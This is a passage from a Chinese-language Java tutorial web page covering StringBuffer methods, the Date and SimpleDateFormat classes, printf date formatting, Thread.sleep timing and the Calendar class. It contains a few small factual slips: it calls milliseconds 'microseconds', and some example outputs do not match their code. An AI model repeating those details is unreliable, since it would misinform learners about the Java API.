class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer str1 = <span class="hljs-keyword">new</span> StringBuffer();<br>StringBuffer str2 = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-number">10</span>);<br>StringBuffer str3 = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;青春无悔&quot;</span>);<br>System.out.println(str1.capacity());    <span class="hljs-comment">// 输出 16 str1.capacity() 用于查看 str1 的容量</span><br>System.out.println(str2.capacity());    <span class="hljs-comment">// 输出 10</span><br>System.out.println(str3.capacity());    <span class="hljs-comment">// 输出 20</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-追加字符串"><a href="#1-2-追加字符串" class="headerlink" title="1.2 追加字符串"></a>1.2 追加字符串</h3><p>StringBuffer 类的 append() 方法用于向原有 StringBuffer 对象中追加字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.append(String str)<br><br>StringBuffer buffer = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello,&quot;</span>);    <span class="hljs-comment">// 创建一个 StringBuffer 对象</span><br>String str = <span class="hljs-string">&quot;World!&quot;</span>;<br>buffer.append(str);    <span class="hljs-comment">// 向 StringBuffer 对象追加 str 字符串</span><br><span class="hljs-comment">// 输出：Hello,World!</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-替换字符"><a href="#1-3-替换字符" class="headerlink" title="1.3 替换字符"></a>1.3 替换字符</h3><p>StringBuffer 类的 setCharAt() 方法用于在字符串的指定索引位置替换一个字符。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.setCharAt(<span class="hljs-keyword">int</span> index, <span class="hljs-keyword">char</span> ch);<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello&quot;</span>);<br>sb.setCharAt(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;E&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：hEllo</span><br>sb.setCharAt(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;H&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：HEllo</span><br>sb.setCharAt(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;p&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：HEplo</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-反转字符串"><a href="#1-4-反转字符串" class="headerlink" title="1.4 反转字符串"></a>1.4 反转字符串</h3><p>StringBuffer 类中的 reverse() 方法用于将字符串序列用其反转的形式取代。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.reverse();<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;java&quot;</span>);<br>sb.reverse();<br>System.out.println(sb);    <span class="hljs-comment">// 输出：avaj</span><br></code></pre></div></td></tr></table></figure><h3 id="1-5-删除字符串"><a href="#1-5-删除字符串" class="headerlink" title="1.5 删除字符串"></a>1.5 删除字符串</h3><p>StringBuffer 类提供了 deleteCharAt() 和 delete() 两个删除字符串的方法。</p><h4 id="1-5-1-deleteCharAt-方法"><a href="#1-5-1-deleteCharAt-方法" class="headerlink" title="1.5.1 deleteCharAt() 方法"></a>1.5.1 deleteCharAt() 方法</h4><p>deleteCharAt() 方法用于移除(删除)序列中指定位置的字符，然后将剩余的内容形成一个新的字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.deleteCharAt(<span class="hljs-keyword">int</span> index);<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;She&quot;</span>);<br>sb.deleteCharAt(<span class="hljs-number">2</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：Sh</span><br></code></pre></div></td></tr></table></figure><h4 id="1-5-2-delete-方法"><a href="#1-5-2-delete-方法" class="headerlink" title="1.5.2 delete() 方法"></a>1.5.2 delete() 方法</h4><p>delete() 方法用于移除序列中子字符串的字符。该方法的作用是删除指定区域以内的所有字符。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.delete(<span class="hljs-keyword">int</span> start,<span class="hljs-keyword">int</span> end);<br><span class="hljs-comment">//start 表示要删除字符的起始索引值（包括索引值所对应的字符），end 表示要删除字符串的结束索引值（不包括索引值所对应的字符）。</span><br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello jack&quot;</span>);<br>sb.delete(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：he jack</span><br>sb.delete(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：heck</span><br></code></pre></div></td></tr></table></figure><h2 id="2-Java-日期时间"><a href="#2-Java-日期时间" class="headerlink" title="2.Java 日期时间"></a>2.Java 日期时间</h2><p>java.util包提供了Date类来封装当前的日期和时间。 Date类提供两个构造函数来实例化Date对象。</p><p>第一个构造函数使用当前日期和时间来初始化对象。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Date( )<br></code></pre></div></td></tr></table></figure><p>第二个构造函数接收一个参数，该参数是从1970年1月1日起的微秒数。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Date(<span class="hljs-keyword">long</span> millisec)<br></code></pre></div></td></tr></table></figure><p>Date对象创建以后，可以调用的方法。</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>boolean after(Date date)</strong></td><td align="center">若当调用此方法的Date对象在指定日期之后返回true,否则返回false。</td></tr><tr><td align="center"><strong>boolean before(Date date)</strong></td><td align="center">若当调用此方法的Date对象在指定日期之前返回true,否则返回false。</td></tr><tr><td align="center"><strong>Object clone( )</strong></td><td align="center">返回此对象的副本。</td></tr><tr><td align="center"><strong>int compareTo(Date date)</strong></td><td align="center">比较当调用此方法的Date对象和指定日期。两者相等时候返回0。调用对象在指定日期之前则返回负数。调用对象在指定日期之后则返回正数。</td></tr><tr><td align="center"><strong>int compareTo(Object obj)</strong></td><td align="center">若obj是Date类型则操作等同于compareTo(Date) 。否则它抛出ClassCastException。</td></tr><tr><td align="center"><strong>boolean equals(Object date)</strong></td><td align="center">当调用此方法的Date对象和指定日期相等时候返回true,否则返回false。</td></tr><tr><td align="center"><strong>long getTime( )</strong></td><td align="center">返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。</td></tr><tr><td align="center"><strong>int hashCode( )</strong></td><td align="center">返回此对象的哈希码值。</td></tr><tr><td align="center"><strong>void setTime(long time)</strong></td><td align="center">用自1970年1月1日00:00:00 GMT以后time毫秒数设置时间和日期。</td></tr><tr><td align="center"><strong>String toString( )</strong></td><td align="center">转换Date对象为String表示形式，并返回该字符串。</td></tr></tbody></table><h3 id="2-1-获取当前日期时间"><a href="#2-1-获取当前日期时间" class="headerlink" title="2.1 获取当前日期时间"></a>2.1 获取当前日期时间</h3><p>使用Date对象的 toString()方法来打印当前日期和时间。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Date;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DateDemo</span> </span>&#123;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>       <span class="hljs-comment">// 初始化 Date 对象</span><br>       Date date = <span class="hljs-keyword">new</span> Date();<br>        <br>       <span class="hljs-comment">// 使用 toString() 函数显示日期时间</span><br>       System.out.println(date.toString());<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Mon May <span class="hljs-number">04</span> 09:<span class="hljs-number">51</span>:<span class="hljs-number">52</span> CDT <span class="hljs-number">2013</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-日期比较"><a href="#2-2-日期比较" class="headerlink" title="2.2 日期比较"></a>2.2 日期比较</h3><p>Java使用三种方法来比较两个日期。</p><blockquote><ol><li>使用getTime( ) 方法获取两个日期（自1970年1月1日经历的微秒数值），然后比较这两个值。</li></ol></blockquote><blockquote><ol start="2"><li>使用方法before()，after()和equals()。例如，一个月的12号比18号早，则new Date(99, 2, 12).before(new Date (99, 2, 18))返回true。</li></ol></blockquote><blockquote><ol start="3"><li>使用compareTo()方法，它是由Comparable接口定义的，Date类实现了这个接口。</li></ol></blockquote><h3 id="2-3-使用SimpleDateFormat格式化日期"><a href="#2-3-使用SimpleDateFormat格式化日期" class="headerlink" title="2.3 使用SimpleDateFormat格式化日期"></a>2.3 使用SimpleDateFormat格式化日期</h3><p>SimpleDateFormat是一个以语言环境敏感的方式来格式化和分析日期的类。SimpleDateFormat允许用户选择任何自定义日期时间格式来运行。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">import</span> java.text.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DateDemo</span> </span>&#123;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br><br>      Date dNow = <span class="hljs-keyword">new</span> Date( );<br>      SimpleDateFormat ft = <br>      <span class="hljs-keyword">new</span> SimpleDateFormat (<span class="hljs-string">&quot;E yyyy.MM.dd &#x27;at&#x27; hh:mm:ss a zzz&quot;</span>);<br><br>      System.out.println(<span class="hljs-string">&quot;Current Date: &quot;</span> + ft.format(dNow));<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Current Date: Sun <span class="hljs-number">2004.07</span><span class="hljs-number">.18</span> at <span class="hljs-number">04</span>:<span class="hljs-number">14</span>:09 PM PDT<br></code></pre></div></td></tr></table></figure><h4 id="2-3-1-简单的DateFormat格式化编码"><a href="#2-3-1-简单的DateFormat格式化编码" class="headerlink" title="2.3.1 简单的DateFormat格式化编码"></a>2.3.1 简单的DateFormat格式化编码</h4><table><thead><tr><th align="center"><strong>字母</strong></th><th align="center"><strong>描述</strong></th><th align="center"><strong>示例</strong></th></tr></thead><tbody><tr><td align="center">G</td><td align="center">纪元标记</td><td align="center">AD</td></tr><tr><td align="center">y</td><td align="center">四位年份</td><td align="center">2001</td></tr><tr><td align="center">M</td><td align="center">月份</td><td align="center">July or 07</td></tr><tr><td align="center">d</td><td align="center">一个月的日期</td><td align="center">10</td></tr><tr><td align="center">h</td><td align="center">A.M./P.M. (1~12)格式小时</td><td align="center">12</td></tr><tr><td align="center">H</td><td align="center">一天中的小时 (0~23)</td><td align="center">22</td></tr><tr><td align="center">m</td><td align="center">分钟数</td><td align="center">30</td></tr><tr><td align="center">s</td><td align="center">秒数</td><td align="center">55</td></tr><tr><td align="center">S</td><td align="center">微妙数</td><td align="center">234</td></tr><tr><td align="center">E</td><td align="center">星期几</td><td align="center">Tuesday</td></tr><tr><td align="center">D</td><td align="center">一年中的日子</td><td align="center">360</td></tr><tr><td align="center">F</td><td align="center">一个月中第几周的周几</td><td align="center">2 (second Wed. in July)</td></tr><tr><td align="center">w</td><td align="center">一年中第几周</td><td align="center">40</td></tr><tr><td align="center">W</td><td align="center">一个月中第几周</td><td align="center">1</td></tr><tr><td align="center">a</td><td align="center">A.M./P.M. 标记</td><td align="center">PM</td></tr><tr><td align="center">k</td><td align="center">一天中的小时(1~24)</td><td align="center">24</td></tr><tr><td align="center">K</td><td align="center">A.M./P.M. (0~11)格式小时</td><td align="center">10</td></tr><tr><td align="center">z</td><td align="center">时区</td><td align="center">Eastern Standard Time</td></tr><tr><td align="center">‘</td><td align="center">文字定界符</td><td align="center">Delimiter</td></tr><tr><td align="center">“</td><td align="center">单引号</td><td align="center">`</td></tr></tbody></table><h3 id="2-4-使用printf格式化日期"><a href="#2-4-使用printf格式化日期" class="headerlink" title="2.4 使用printf格式化日期"></a>2.4 使用printf格式化日期</h3><p>printf方法可以很轻松地格式化时间和日期。使用两个字母格式，它以t开头并且以下面表格中的一个字母结尾。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DateDemo</span> </span>&#123;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>     <span class="hljs-comment">// 初始化 Date 对象</span><br>     Date date = <span class="hljs-keyword">new</span> Date();<br><br>     <span class="hljs-comment">// 使用toString()显示日期和时间</span><br>     String str = String.format(<span class="hljs-string">&quot;Current Date/Time : %tc&quot;</span>, date );<br><br>     System.out.printf(str);<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Current Date/Time : Sat Dec <span class="hljs-number">15</span> <span class="hljs-number">16</span>:<span class="hljs-number">37</span>:<span class="hljs-number">57</span> MST <span class="hljs-number">2012</span><br></code></pre></div></td></tr></table></figure><p>如果需要重复提供日期，那么利用这种方式来格式化它的每一部分就有点复杂了。因此，可以利用一个格式化字符串指出要被格式化的参数的索引。索引必须紧跟在%后面，而且必须以$结束。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Date;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DateDemo</span> </span>&#123;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>       <span class="hljs-comment">// 初始化 Date 对象</span><br>       Date date = <span class="hljs-keyword">new</span> Date();<br>        <br>       <span class="hljs-comment">// 使用toString()显示日期和时间</span><br>       System.out.printf(<span class="hljs-string">&quot;%1$s %2$tB %2$td, %2$tY&quot;</span>, <br>                         <span class="hljs-string">&quot;Due date:&quot;</span>, date);<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Due date: February 09, <span class="hljs-number">2004</span><br></code></pre></div></td></tr></table></figure><p>或者，可以使用 &lt; 标志。它表明先前被格式化的参数要被再次使用。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Date;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DateDemo</span> </span>&#123;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>       <span class="hljs-comment">// 初始化 Date 对象</span><br>       Date date = <span class="hljs-keyword">new</span> Date();<br>        <br>       <span class="hljs-comment">// 显示格式化时间</span><br>       System.out.printf(<span class="hljs-string">&quot;%s %tB %&lt;te, %&lt;tY&quot;</span>,<br>                           <span class="hljs-string">&quot;Due date:&quot;</span>, date);<br>   &#125;<br>&#125; <br><span class="hljs-comment">/*输出结果*/</span><br>Due date: February 09, <span class="hljs-number">2004</span><br></code></pre></div></td></tr></table></figure><h3 id="2-5-解析字符串为时间"><a href="#2-5-解析字符串为时间" class="headerlink" title="2.5 解析字符串为时间"></a>2.5 解析字符串为时间</h3><p>SimpleDateFormat 类有一些附加的方法，特别是parse()，它试图按照给定的SimpleDateFormat 对象的格式化存储来解析字符串。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">import</span> java.text.*;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DateDemo</span> </span>&#123;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>      SimpleDateFormat ft = <span class="hljs-keyword">new</span> SimpleDateFormat (<span class="hljs-string">&quot;yyyy-MM-dd&quot;</span>); <br><br>      String input = args.length == <span class="hljs-number">0</span> ? <span class="hljs-string">&quot;1818-11-11&quot;</span> : args[<span class="hljs-number">0</span>]; <br><br>      System.out.print(input + <span class="hljs-string">&quot; Parses as &quot;</span>); <br><br>      Date t; <br><br>      <span class="hljs-keyword">try</span> &#123; <br>          t = ft.parse(input); <br>          System.out.println(t); <br>      &#125; <span class="hljs-keyword">catch</span> (ParseException e) &#123; <br>          System.out.println(<span class="hljs-string">&quot;Unparseable using &quot;</span> + ft); <br>      &#125;<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>$ java DateDemo<br><span class="hljs-number">1818</span>-<span class="hljs-number">11</span>-<span class="hljs-number">11</span> Parses as Wed Nov <span class="hljs-number">11</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT <span class="hljs-number">1818</span><br>$ java DateDemo <span class="hljs-number">2007</span>-<span class="hljs-number">12</span>-<span class="hljs-number">01</span><br><span class="hljs-number">2007</span>-<span class="hljs-number">12</span>-<span class="hljs-number">01</span> Parses as Sat Dec <span class="hljs-number">01</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT <span class="hljs-number">2007</span><br></code></pre></div></td></tr></table></figure><h3 id="2-6-休眠-sleep"><a href="#2-6-休眠-sleep" class="headerlink" title="2.6 休眠(sleep)"></a>2.6 休眠(sleep)</h3><p>可以让程序休眠一毫秒的时间或者到您的计算机的寿命长的任意段时间。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SleepDemo</span> </span>&#123;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>      <span class="hljs-keyword">try</span> &#123; <br>         System.out.println(<span class="hljs-keyword">new</span> Date( ) + <span class="hljs-string">&quot;\n&quot;</span>); <br>         Thread.sleep(<span class="hljs-number">5</span>*<span class="hljs-number">60</span>*<span class="hljs-number">10</span>); <br>         System.out.println(<span class="hljs-keyword">new</span> Date( ) + <span class="hljs-string">&quot;\n&quot;</span>); <br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123; <br>          System.out.println(<span class="hljs-string">&quot;Got an exception!&quot;</span>); <br>      &#125;<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Sun May <span class="hljs-number">03</span> <span class="hljs-number">18</span>:<span class="hljs-number">04</span>:<span class="hljs-number">41</span> GMT <span class="hljs-number">2009</span><br><br>Sun May <span class="hljs-number">03</span> <span class="hljs-number">18</span>:<span class="hljs-number">04</span>:<span class="hljs-number">44</span> GMT <span class="hljs-number">2009</span><br></code></pre></div></td></tr></table></figure><h3 id="2-7-测量时间"><a href="#2-7-测量时间" class="headerlink" title="2.7 测量时间"></a>2.7 测量时间</h3><p>实例：测量时间间隔（以毫秒为单位）</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DiffDemo</span> </span>&#123;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-keyword">long</span> start = System.currentTimeMillis( );<br>         System.out.println(<span class="hljs-keyword">new</span> Date( ) + <span class="hljs-string">&quot;\n&quot;</span>);<br>         Thread.sleep(<span class="hljs-number">5</span>*<span class="hljs-number">60</span>*<span class="hljs-number">10</span>);<br>         System.out.println(<span class="hljs-keyword">new</span> Date( ) + <span class="hljs-string">&quot;\n&quot;</span>);<br>         <span class="hljs-keyword">long</span> end = System.currentTimeMillis( );<br>         <span class="hljs-keyword">long</span> diff = end - start;<br>         System.out.println(<span class="hljs-string">&quot;Difference is : &quot;</span> + diff);<br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>         System.out.println(<span class="hljs-string">&quot;Got an exception!&quot;</span>);<br>      &#125;<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Sun May <span class="hljs-number">03</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">51</span> GMT <span class="hljs-number">2009</span><br><br>Sun May <span class="hljs-number">03</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">57</span> GMT <span class="hljs-number">2009</span><br><br>Difference is : <span class="hljs-number">5993</span><br></code></pre></div></td></tr></table></figure><h3 id="2-8-Calendar类"><a href="#2-8-Calendar类" class="headerlink" title="2.8 Calendar类"></a>2.8 Calendar类</h3><p>使用Calendar 类。能设置和获取日期数据的特定部分，比如小时，日，或者分钟。 又可以在日期的这些部分加上或者减去值。</p><p>Calendar类的功能要比Date类强大很多，而且在实现方式上也比Date类要复杂一些。Calendar类是一个抽象类，在实际使用时实现特定的子类的对象，创建对象的过程对程序员来说是透明的，只需要使用getInstance方法创建即可。</p><h4 id="2-8-1-创建一个代表系统当前日期的Calendar对象"><a href="#2-8-1-创建一个代表系统当前日期的Calendar对象" class="headerlink" title="2.8.1 创建一个代表系统当前日期的Calendar对象"></a>2.8.1 创建一个代表系统当前日期的Calendar对象</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Calendar c = Calendar.getInstance();<span class="hljs-comment">//默认是当前日期</span><br></code></pre></div></td></tr></table></figure><h4 id="2-8-2-创建一个指定日期的Calendar对象"><a href="#2-8-2-创建一个指定日期的Calendar对象" class="headerlink" title="2.8.2 创建一个指定日期的Calendar对象"></a>2.8.2 创建一个指定日期的Calendar对象</h4><p>使用Calendar类代表特定的时间，需要首先创建一个Calendar的对象，然后再设定该对象中的年月日参数来完成。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//创建一个代表2009年6月12日的Calendar对象</span><br>Calendar c1 = Calendar.getInstance();<br>c1.set(<span class="hljs-number">2009</span>, <span class="hljs-number">6</span> - <span class="hljs-number">1</span>, <span class="hljs-number">12</span>);<br></code></pre></div></td></tr></table></figure><h4 id="2-8-3-Calendar类对象字段类型"><a href="#2-8-3-Calendar类对象字段类型" class="headerlink" title="2.8.3 Calendar类对象字段类型"></a>2.8.3 Calendar类对象字段类型</h4><p>Calendar类中用以下这些常量表示不同的意义。</p><table><thead><tr><th align="center">常量</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Calendar.YEAR</td><td align="center">年份</td></tr><tr><td align="center">Calendar.MONTH</td><td align="center">月份</td></tr><tr><td align="center">Calendar.DATE</td><td align="center">日期</td></tr><tr><td align="center">Calendar.DAY_OF_MONTH</td><td align="center">日期，和上面的字段意义完全相同</td></tr><tr><td align="center">Calendar.HOUR</td><td align="center">12小时制的小时</td></tr><tr><td align="center">Calendar.HOUR_OF_DAY</td><td align="center">24小时制的小时</td></tr><tr><td align="center">Calendar.MINUTE</td><td align="center">分钟</td></tr><tr><td align="center">Calendar.SECOND</td><td align="center">秒</td></tr><tr><td align="center">Calendar.DAY_OF_WEEK</td><td 